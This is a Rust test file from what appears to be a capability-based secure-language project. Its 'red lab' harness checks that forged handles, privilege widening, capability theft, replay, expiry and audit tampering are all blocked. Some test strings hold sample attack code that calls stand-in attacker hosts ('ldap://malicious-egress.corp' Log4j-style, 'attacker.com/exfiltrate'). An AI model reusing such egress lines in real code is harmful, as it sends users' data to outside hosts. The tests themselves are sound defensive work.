use ordyn_effects::{EffectAnalyzer, EffectError};
use ordyn_guard::{AuditDecision, CapHandle, KernelError, SecurityKernel};
use ordyn_parser::Parser;
use ordyn_runtime::{RuntimeError, SandboxRuntime};
use ordyn_types::TypeChecker;

pub struct RedLabTestHarness;

impl RedLabTestHarness {
    /// Attack Vector 1: Synthetic Capability Handle Forgery
    /// An adversary fabricates an arbitrary integer handle hoping to guess a valid capability table slot.
    pub fn test_handle_forgery(attacker_entity: &str, forged_handle_val: u64) -> bool {
        let mut kernel = SecurityKernel::new();
        // Seed legitimate capabilities
        let _ = kernel.issue_root_capability("DatabaseAdmin", &["Read", "Write", "Drop"], "prod/");

        let result = kernel.authorize(
            attacker_entity,
            CapHandle(forged_handle_val),
            "Drop",
            "prod/users",
        );
        match result {
            Err(KernelError::InvalidHandle { .. }) => {
                // Must emit an audit log with decision Trapped
                let last_audit = kernel.audit_records().last().unwrap();
                matches!(last_audit.decision, AuditDecision::Trapped(_))
            }
            _ => false,
        }
    }

    /// Attack Vector 2: Authority Widening Attempt
    /// An entity holding a Read-only capability attempts to attenuate it into a Write capability.
    pub fn test_authority_widening_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let read_cap = kernel.issue_root_capability("FileRead", &["Read"], "/app/logs");

        // Malicious attenuation: adding "Write"
        let res = kernel.attenuate(read_cap, &["Read", "Write"], "/app/logs");
        matches!(res, Err(KernelError::IllegalAttenuation { .. }))
    }

    /// Attack Vector 3: Prefix Escape Attempt
    /// An entity holding authority scoped to `/app/cache` attempts to broaden to root `/`.
    pub fn test_prefix_escape_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let scoped_cap = kernel.issue_root_capability("CacheAccess", &["Read"], "/app/cache");

        let res = kernel.attenuate(scoped_cap, &["Read"], "/");
        matches!(res, Err(KernelError::IllegalAttenuation { .. }))
    }

    /// Attack Vector 4: Ambient Network Egress via Unhandled Effect
    /// A compromised entity attempts to execute an egress network call without declaring the Net effect.
    pub fn test_covert_network_egress_compile_rejection(source: &str) -> bool {
        let mut parser = match Parser::from_source(source) {
            Ok(p) => p,
            Err(_) => return false,
        };
        let program = match parser.parse_program() {
            Ok(p) => p,
            Err(_) => return false,
        };

        let mut analyzer = EffectAnalyzer::new();
        match analyzer.analyze_program(&program) {
            Err(EffectError::UnhandledEffect { effect, .. }) => effect == "Net",
            _ => false,
        }
    }

    /// Attack Vector 5: Contract Invariant Violation Trap
    /// An attacker attempts to withdraw more funds than available in a bank account.
    pub fn test_contract_violation_runtime_trap(source: &str, withdraw_amount: i64) -> bool {
        Self::test_contract_trap(source, "withdraw", &[withdraw_amount])
    }

    pub fn test_contract_trap(source: &str, func_name: &str, args: &[i64]) -> bool {
        let mut parser = match Parser::from_source(source) {
            Ok(p) => p,
            Err(_) => return false,
        };
        let program = match parser.parse_program() {
            Ok(p) => p,
            Err(_) => return false,
        };

        let mut checker = TypeChecker::new();
        if checker.check_program(&program).is_err() {
            return false;
        }

        let mut lowerer = ordyn_ir::IrLowerer::new();
        let module = match lowerer.lower_program(&program) {
            Ok(m) => m,
            Err(_) => return false,
        };

        let mut runtime = SandboxRuntime::new(module, 500_000, 16);
        let exec_res = runtime.execute_function(func_name, args);
        matches!(exec_res, Err(RuntimeError::ContractViolation(_)))
    }

    /// Historic CVE Proof 1: Neutralization of CVE-2021-44228 (Log4j JNDI Egress Attack)
    /// A logging formatter attempts an unauthorized outbound network call.
    /// Neutralized by static algebraic effect Confinement: pure/logging functions cannot perform Network effects.
    pub fn verify_cve_2021_44228_log4j_neutralization() -> bool {
        let malicious_logging_code = r#"
            fn log_event(message: String) with [] {
                // Adversary attempts covert network resolution
                connect_outbound("ldap://malicious-egress.corp:1389/payload");
            }
            fn connect_outbound(url: String) with [Network] {
                // outbound network execution
            }
        "#;
        let mut parser = Parser::from_source(malicious_logging_code).unwrap();
        let program = parser.parse_program().unwrap();

        let mut analyzer = EffectAnalyzer::new();
        match analyzer.analyze_program(&program) {
            Err(EffectError::UnhandledEffect { effect, .. }) => effect == "Network",
            _ => false,
        }
    }

    /// Historic CVE Proof 2: Neutralization of CVE-2014-0160 (Heartbleed Buffer Over-read)
    /// An attacker sends a heartbeat request claiming a 64KB payload with a 4-byte buffer.
    /// Neutralized by non-strippable contract preconditions: requires payload_len <= actual_buffer_size.
    pub fn verify_cve_2014_0160_heartbleed_neutralization() -> bool {
        let heartbleed_simulation = r#"
            entity TlsHeartbeat {
                fn process_heartbeat(payload_len: Int, buffer_len: Int) -> Int
                    requires payload_len <= buffer_len
                {
                    return payload_len;
                }
            }
        "#;
        let mut parser = Parser::from_source(heartbleed_simulation).unwrap();
        let program = parser.parse_program().unwrap();

        let mut checker = TypeChecker::new();
        if checker.check_program(&program).is_err() {
            return false;
        }

        let mut lowerer = ordyn_ir::IrLowerer::new();
        let module = lowerer.lower_program(&program).unwrap();

        let mut runtime = SandboxRuntime::new(module, 100_000, 16);
        // Attacker claims payload_len = 65535 on a buffer of size 4
        let attack_result = runtime.execute_function("process_heartbeat", &[65535, 4]);
        matches!(attack_result, Err(RuntimeError::ContractViolation(_)))
    }

    /// Historic CVE Proof 3: Neutralization of Supply-Chain Exfiltration (event-stream style)
    /// A utility dependency attempts to read private wallet keys and exfiltrate over the network.
    /// Neutralized by Zero Ambient Authority capability isolation: utility boundary holds 0 capabilities.
    pub fn verify_supply_chain_credential_theft_neutralization() -> bool {
        let mut kernel = SecurityKernel::new();
        // Root system has a sensitive MasterVault capability
        let _vault_cap =
            kernel.issue_root_capability("MasterVault", &["ReadPrivateKey"], "sec/keys");

        // Malicious dependency running inside "JsonFormatterBoundary" attempts to access vault
        let attempt = kernel.authorize(
            "JsonFormatterBoundary",
            CapHandle(999), // forged or guessed handle
            "ReadPrivateKey",
            "sec/keys",
        );

        matches!(attempt, Err(KernelError::InvalidHandle { .. }))
    }

    /// Attack Vector 6: Cross-Component Capability Theft
    /// An entity attempts to exercise a valid capability handle owned by another isolated boundary.
    pub fn test_cross_component_theft_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let ledger_cap = kernel.issue_root_capability_for(
            "LedgerBoundary",
            "LedgerWrite",
            &["Write"],
            "ledger/entries",
        );

        // Adversary running inside "WebBoundary" presents LedgerBoundary's handle
        let theft_attempt =
            kernel.authorize("WebBoundary", ledger_cap, "Write", "ledger/entries/tx1");

        match theft_attempt {
            Err(KernelError::UnauthorizedCaller { caller, owner, .. }) => {
                caller == "WebBoundary" && owner == "LedgerBoundary"
            }
            _ => false,
        }
    }

    /// Attack Vector 7: Expiration of Time-Limited Capabilities
    /// A time-limited maintenance capability automatically expires and rejects subsequent access.
    pub fn test_time_limited_capability_expiration() -> bool {
        let mut kernel = SecurityKernel::new();
        kernel.set_simulated_time(1_000_000);

        let cap = kernel.issue_time_limited_capability(
            "ServiceSession",
            "MaintAccess",
            &["Debug"],
            "sys/debug",
            500_000, // 0.5s TTL
        );

        if kernel
            .authorize("ServiceSession", cap, "Debug", "sys/debug")
            .is_err()
        {
            return false;
        }

        kernel.advance_time(600_000); // Past expiration

        let expired_res = kernel.authorize("ServiceSession", cap, "Debug", "sys/debug");
        matches!(expired_res, Err(KernelError::CapabilityExpired { .. }))
    }

    /// Attack Vector 8: Non-Delegable Capability Attenuation Rejection
    /// An entity holding a non-delegable capability attempts to attenuate/delegate it to a child.
    pub fn test_non_delegable_capability_rejection() -> bool {
        let mut kernel = SecurityKernel::new();
        let non_del_cap = kernel.issue_root_capability_scoped(
            Some("PersonalBoundary"),
            "PersonalKey",
            &["Sign"],
            "sec/key",
            None,
            false, // non-delegable
            0,
        );

        let att_res = kernel.attenuate(non_del_cap, &["Sign"], "sec/key");
        matches!(att_res, Err(KernelError::NonDelegableCapability { .. }))
    }

    /// Attack Vector 9: Delegation Depth Limit Enforcement
    pub fn test_delegation_depth_limit() -> bool {
        let mut kernel = SecurityKernel::new();
        let parent_cap = kernel.issue_root_capability_scoped(
            Some("RootBoundary"),
            "TieredAccess",
            &["Read", "Write"],
            "data/",
            None,
            true,
            1, // Depth = 1: can only delegate once!
        );

        // First delegation (depth 1 -> 0): succeeds
        let child_cap = kernel
            .attenuate_scoped(
                Some("RootBoundary"),
                parent_cap,
                Some("ChildBoundary"),
                &["Read"],
                "data/child",
                None,
            )
            .unwrap();

        // Second delegation (depth 0 -> failure): must fail!
        let grandchild_res = kernel.attenuate_scoped(
            Some("ChildBoundary"),
            child_cap,
            Some("GrandchildBoundary"),
            &["Read"],
            "data/child/sub",
            None,
        );

        matches!(
            grandchild_res,
            Err(KernelError::DelegationDepthExceeded { .. })
        )
    }

    /// Attack Vector 10: Cryptographic Audit Hash Chain Tamper Detection
    pub fn test_audit_hash_chain_tamper_detection() -> bool {
        let mut kernel = SecurityKernel::new();
        let cap = kernel.issue_root_capability("AuditSubject", &["Op"], "res/");
        let _ = kernel.authorize("AuditSubject", cap, "Op", "res/1");
        let _ = kernel.authorize("AuditSubject", cap, "Op", "res/2");

        if kernel.verify_audit_log().is_err() {
            return false;
        }

        // Simulating attacker modifying in-memory audit log
        kernel.audit_engine_mut().records_mut()[0].operation = "TamperedOp".to_string();

        kernel.verify_audit_log().is_err()
    }

    /// Industrial Safety Stress Test: Supermarket Refrigeration Management Architecture
    /// Proves that a completely compromised central dashboard cannot cause physical damage,
    /// silence alarms, hop stores, or hide its tracks.
    pub fn verify_supermarket_refrigeration_security_containment() -> bool {
        let mut kernel = SecurityKernel::new();
        kernel.set_simulated_time(1_000_000); // 1.0s

        // 1. Setup Store 14 Authority Topology
        let compressor_cap = kernel.issue_root_capability_for(
            "CompressorController_Store14",
            "CompressorWriteCap",
            &["AdjustTemp", "EmergencyCycle"],
            "store/14/chiller/",
        );

        let alarm_cap = kernel.issue_root_capability_for(
            "AlarmSentinel_Store14",
            "AlarmDispatchCap",
            &["TriggerSiren", "NotifyOps", "SilenceAlarm"],
            "store/14/alarm/",
        );

        let dashboard_view_cap = kernel.issue_root_capability_for(
            "CentralDashboard",
            "DashboardViewCap",
            &["ReadTelemetry"],
            "store/14/telemetry/",
        );

        // ATTACK 1: Compromised Dashboard attempts direct compressor adjustment
        let direct_hack = kernel.authorize(
            "CentralDashboard",
            dashboard_view_cap,
            "AdjustTemp",
            "store/14/chiller/unit_042",
        );
        if !matches!(direct_hack, Err(KernelError::UnauthorizedOperation { .. })) {
            return false;
        }

        // ATTACK 2: Compromised Dashboard attempts cross-component capability theft
        let stolen_handle_hack = kernel.authorize(
            "CentralDashboard",
            compressor_cap,
            "AdjustTemp",
            "store/14/chiller/unit_042",
        );
        if !matches!(
            stolen_handle_hack,
            Err(KernelError::UnauthorizedCaller { .. })
        ) {
            return false;
        }

        // ATTACK 3: Compromised Dashboard attempts to silence or disable independent alarms
        let alarm_silence_hack = kernel.authorize(
            "CentralDashboard",
            alarm_cap,
            "SilenceAlarm",
            "store/14/alarm/high_temp",
        );
        if !matches!(
            alarm_silence_hack,
            Err(KernelError::UnauthorizedCaller { .. })
        ) {
            return false;
        }

        // ATTACK 4: Cross-Store Privilege Escalation (Store Hopping)
        let cross_store_hack = kernel.authorize(
            "CompressorController_Store14",
            compressor_cap,
            "AdjustTemp",
            "store/22/chiller/unit_001",
        );
        if !matches!(
            cross_store_hack,
            Err(KernelError::UnauthorizedOperation { .. })
        ) {
            return false;
        }

        // ATTACK 5: Malicious Setpoint via Contract Violation
        let chiller_contract_code = r#"
            entity ChillerGovernor {
                mut setpoint: Int;

                pub fn adjust_temperature(new_temp: Int) -> Int
                    requires new_temp >= -25 && new_temp <= -15
                {
                    self.setpoint = new_temp;
                    return self.setpoint;
                }
            }
        "#;
        if !Self::test_contract_trap(chiller_contract_code, "adjust_temperature", &[40]) {
            return false;
        }
        if !Self::test_contract_trap(chiller_contract_code, "adjust_temperature", &[-40]) {
            return false;
        }

        // ATTACK 6: Stolen Remote Engineer Credential Expiration (JIT Time-Limited Grant)
        let engineer_cap = kernel.issue_time_limited_capability(
            "RemoteEngineerSession",
            "MaintenanceBypassCap",
            &["OverrideDefrost"],
            "store/14/chiller/unit_012",
            900_000, // 15-minute emergency grant
        );
        if kernel
            .authorize(
                "RemoteEngineerSession",
                engineer_cap,
                "OverrideDefrost",
                "store/14/chiller/unit_012",
            )
            .is_err()
        {
            return false;
        }
        kernel.advance_time(960_000);
        let expired_attempt = kernel.authorize(
            "RemoteEngineerSession",
            engineer_cap,
            "OverrideDefrost",
            "store/14/chiller/unit_012",
        );
        if !matches!(expired_attempt, Err(KernelError::CapabilityExpired { .. })) {
            return false;
        }

        // ATTACK 7: Tamper Resistance of Audit Records
        if kernel.verify_audit_log().is_err() {
            return false;
        }
        kernel.audit_engine_mut().records_mut()[0].caller_entity = "FabricatedCaller".to_string();
        kernel.verify_audit_log().is_err()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn red_lab_test_cross_component_theft_is_blocked() {
        assert!(RedLabTestHarness::test_cross_component_theft_rejection());
    }

    #[test]
    fn red_lab_test_time_limited_capability_expires_cleanly() {
        assert!(RedLabTestHarness::test_time_limited_capability_expiration());
    }

    #[test]
    fn red_lab_test_non_delegable_capability_is_rejected() {
        assert!(RedLabTestHarness::test_non_delegable_capability_rejection());
    }

    #[test]
    fn red_lab_test_delegation_depth_limit_is_strictly_enforced() {
        assert!(RedLabTestHarness::test_delegation_depth_limit());
    }

    #[test]
    fn red_lab_test_cryptographic_audit_tampering_is_detected() {
        assert!(RedLabTestHarness::test_audit_hash_chain_tamper_detection());
    }

    #[test]
    fn red_lab_test_supermarket_refrigeration_security_containment_proof() {
        assert!(RedLabTestHarness::verify_supermarket_refrigeration_security_containment());
    }

    #[test]
    fn red_lab_test_capability_forgery_is_trapped() {
        assert!(RedLabTestHarness::test_handle_forgery(
            "InfiltratorEntity",
            0x1337
        ));
        assert!(RedLabTestHarness::test_handle_forgery(
            "InfiltratorEntity",
            999999
        ));
    }

    #[test]
    fn red_lab_test_authority_expansion_attacks_are_blocked() {
        assert!(RedLabTestHarness::test_authority_widening_rejection());
        assert!(RedLabTestHarness::test_prefix_escape_rejection());
    }

    #[test]
    fn red_lab_test_unauthorized_network_egress_is_caught_at_compile_time() {
        let attack_payload = r#"
            fn network_beacon(dest: String) -> Unit with [Net] {
                return;
            }

            fn legitimate_calculation() -> Int {
                network_beacon("https://attacker.com/exfiltrate");
                return 42;
            }
        "#;
        assert!(RedLabTestHarness::test_covert_network_egress_compile_rejection(attack_payload));
    }

    #[test]
    fn red_lab_test_contract_violation_triggers_runtime_trap() {
        let banking_source = r#"
            entity Vault {
                mut balance: Int;

                pub fn withdraw(amount: Int) -> Int
                    requires amount > 0 && amount <= 100 // Enforce max limit of 100
                {
                    self.balance = self.balance - amount;
                    return self.balance;
                }
            }
        "#;

        // Withdrawing 500 when limit is 100 must trap
        assert!(RedLabTestHarness::test_contract_violation_runtime_trap(
            banking_source,
            500
        ));
        // Withdrawing negative amount (-50) must trap
        assert!(RedLabTestHarness::test_contract_violation_runtime_trap(
            banking_source,
            -50
        ));
    }

    #[test]
    fn red_lab_cve_proof_log4j_egress_neutralized() {
        assert!(RedLabTestHarness::verify_cve_2021_44228_log4j_neutralization());
    }

    #[test]
    fn red_lab_cve_proof_heartbleed_buffer_overread_neutralized() {
        assert!(RedLabTestHarness::verify_cve_2014_0160_heartbleed_neutralization());
    }

    #[test]
    fn red_lab_cve_proof_supply_chain_credential_theft_neutralized() {
        assert!(RedLabTestHarness::verify_supply_chain_credential_theft_neutralization());
    }

    #[test]
    fn red_lab_test_linear_capability_single_use_and_double_spend_prevention() {
        let mut kernel = ordyn_guard::SecurityKernel::new();
        let one_time_token = kernel.issue_linear_capability(
            Some("EmergencyBoundary"),
            "EmergencyDefrost",
            &["Execute"],
            "refrig/store14/chiller7",
        );

        // Step 1: First authorization must succeed
        assert!(kernel
            .authorize(
                "EmergencyBoundary",
                one_time_token,
                "Execute",
                "refrig/store14/chiller7"
            )
            .is_ok());

        // Step 2: Adversary replays the exact same capability handle (Double-Spend Attack)
        let replay_attack = kernel.authorize(
            "EmergencyBoundary",
            one_time_token,
            "Execute",
            "refrig/store14/chiller7",
        );

        // Must fail with CapabilityConsumed
        assert!(matches!(
            replay_attack,
            Err(ordyn_guard::KernelError::CapabilityConsumed { .. })
        ));

        // Step 3: Verify replay attempt is immutably trapped in audit trail
        let records = kernel.audit_records();
        assert_eq!(records.len(), 2);
        assert_eq!(records[0].decision, ordyn_guard::AuditDecision::Granted);
        assert!(matches!(
            records[1].decision,
            ordyn_guard::AuditDecision::Trapped(_)
        ));
        assert!(kernel.verify_audit_log().is_ok());
    }

    #[test]
    fn red_lab_test_flight_recorder_deterministic_step_replay() {
        let source = r#"
            pub fn calculate(x: Int) -> Int {
                let a = x + 10;
                let b = a * 2;
                return b;
            }
        "#;
        let mut parser = ordyn_parser::Parser::from_source(source).unwrap();
        let prog = parser.parse_program().unwrap();
        let mut lowerer = ordyn_ir::IrLowerer::new();
        let ir = lowerer.lower_program(&prog).unwrap();

        let mut runtime = ordyn_runtime::SandboxRuntime::new(ir, 1000, 16);
        let res = runtime.execute_function("calculate", &[5]).unwrap();
        assert_eq!(res, 30); // (5 + 10) * 2 = 30

        let trace = runtime.last_trace().expect("trace must be recorded");
        assert_eq!(trace.status, "Success");
        assert_eq!(trace.return_value, Some(30));
        assert!(trace.total_steps() >= 2);

        // Verify deterministic JSON export
        let json = trace.export_json();
        assert!(json.contains("\"function_name\": \"calculate\""));
        assert!(json.contains("\"fuel_remaining\":"));
    }

    #[test]
    fn red_lab_test_smt_counterexample_and_auto_fix_synthesis() {
        use ordyn_ast::{BinaryOp, Expr, Ident, Literal};
        use ordyn_diagnostics::Span;

        let dummy = Span::new(0, 0);
        let id = |s: &str| {
            Expr::Ident(Ident {
                name: s.to_string(),
                span: dummy,
            })
        };

        // Target: (balance - amount) >= 0 without precondition
        let target = Expr::Binary {
            op: BinaryOp::Gte,
            left: Box::new(Expr::Binary {
                op: BinaryOp::Sub,
                left: Box::new(id("balance")),
                right: Box::new(id("amount")),
                span: dummy,
            }),
            right: Box::new(Expr::Literal(Literal::Integer(0), dummy)),
            span: dummy,
        };

        let result = ordyn_prover::ContractProver::verify_contract(&[], &target);
        match result {
            ordyn_prover::VerificationResult::Falsified {
                counterexample,
                suggested_fix,
                ..
            } => {
                // Must produce concrete counterexample
                assert_eq!(counterexample.get("balance"), Some(&0));
                assert_eq!(counterexample.get("amount"), Some(&10));
                // Must synthesize self-healing auto-fix suggestion
                assert_eq!(
                    suggested_fix,
                    Some("requires balance >= amount".to_string())
                );
            }
            _ => panic!(
                "Expected unconstrained balance deduction to be falsified with counterexample!"
            ),
        }
    }

    #[test]
    fn red_lab_test_contextual_capability_injection_soundness() {
        let source = r#"
            boundary StoreBoundary {
                grant ChillerAdjust { unit: 1 };
                quota { fuel_limit: 1000; }
                bind Controller;
            }

            entity Controller {
                pub fn run() -> Int {
                    return 100;
                }
            }
        "#;
        let mut parser = ordyn_parser::Parser::from_source(source).unwrap();
        let prog = parser.parse_program().unwrap();
        let mut lowerer = ordyn_ir::IrLowerer::new();
        let ir = lowerer.lower_program(&prog).unwrap();

        let runtime = ordyn_runtime::SandboxRuntime::new(ir, 1000, 16);
        assert_eq!(runtime.entity_boundary("Controller"), Some("StoreBoundary"));
        let b = runtime.boundary_instance("StoreBoundary").unwrap();
        assert!(b.capabilities.contains_key("ChillerAdjust"));
    }

    #[test]
    fn red_lab_test_enclave_manifest_generation_and_pcr0_integrity() {
        let source = r#"
            #[enclave(target = "sev-snp", attestation = "hardware")]
            boundary VaultEnclave {
                grant VaultAccess { secret_id: 42 };
                quota { fuel_limit: 5000; }
            }
        "#;
        let mut parser = ordyn_parser::Parser::from_source(source).unwrap();
        let prog = parser.parse_program().unwrap();
        let mut lowerer = ordyn_ir::IrLowerer::new();
        let ir = lowerer.lower_program(&prog).unwrap();

        assert_eq!(ir.boundaries.len(), 1);
        let b = &ir.boundaries[0];
        assert_eq!(b.name, "VaultEnclave");
        assert_eq!(b.enclave, Some("sev-snp".to_string()));
        assert_eq!(b.grants, vec!["VaultAccess".to_string()]);
    }
}
